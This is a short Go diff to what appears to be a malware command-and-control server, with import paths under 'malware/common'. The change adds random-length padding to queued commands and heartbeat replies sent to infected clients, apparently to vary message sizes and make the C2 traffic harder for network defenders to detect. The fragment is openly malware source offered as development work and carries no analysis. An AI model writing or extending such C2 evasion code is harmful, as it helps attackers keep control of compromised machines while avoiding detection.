@@ -12,6 +12,7 @@ import (
 	"log"
 	pb "malware/common/messages"
 	"malware/common/types"
+	"math/rand"
 	"net"
 	"os"
 	"strconv"
@@ -42,9 +43,11 @@ func (c2 *c2) CheckCommandQueue(ctx context.Context, req *pb.CheckCmdRequest) (*
 	switch u := req.Message.(type) {
 	case *pb.CheckCmdRequest_Heartbeat:
 		select {
-		case x, ok := <-c2.queue:
+		case msg, ok := <-c2.queue:
 			if ok {
-				return x, nil
+				msg.RandomPadding = make([]byte, rand.Intn(100)+1)
+				rand.Read(msg.RandomPadding)
+				return msg, nil
 			} else {
 				panic("Queue closed")
 			}
@@ -62,7 +65,11 @@ func (c2 *c2) CheckCommandQueue(ctx context.Context, req *pb.CheckCmdRequest) (*
 		fmt.Println(req, u)
 		panic("Didn't received a valid message")
 	}
-	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
+	msg := &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}
+	msg.RandomPadding = make([]byte, rand.Intn(100)+1)
+	rand.Read(msg.RandomPadding)
+
+	return msg, nil
 }
 
 func (c2 *c2) help() {
